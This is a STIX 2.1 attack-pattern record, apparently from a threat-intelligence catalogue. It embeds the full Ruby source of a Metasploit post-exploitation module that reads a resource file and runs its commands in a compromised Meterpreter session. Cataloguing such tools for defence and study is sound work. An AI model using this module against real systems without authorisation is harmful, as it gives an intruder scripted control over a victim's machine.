{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b44d1aa-ed37-4af0-b222-75b27ad9c754",
    "created": "2024-08-14T16:33:19.165797Z",
    "modified": "2024-08-14T16:33:19.165801Z",
    "name": "Multi Gather Run Console Resource File",
    "description": " This module will read console commands from a resource file and execute the commands in the specified Meterpreter session.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/run_console_rc_file.rb",
            "external_id": "run_console_rc_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Run Console Resource File',\n        'Description' => %q{\n          This module will read console commands from a resource file and\n          execute the commands in the specified Meterpreter session.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n    register_options(\n      [\n\n        OptString.new('RESOURCE', [true, 'Full path to resource file to read commands from.', nil]),\n\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n    if !::File.exist?(datastore['RESOURCE'])\n      raise 'Resource File does not exist!'\n    else\n      ::File.open(datastore['RESOURCE'], 'rb').each_line do |cmd|\n        next if cmd.strip.empty?\n        next if cmd[0, 1] == '#'\n\n        begin\n          print_status \"Running command #{cmd.chomp}\"\n          session.console.run_single(cmd.chomp)\n        rescue ::Exception => e\n          print_status(\"Error Running Command #{cmd.chomp}: #{e.class} #{e}\")\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}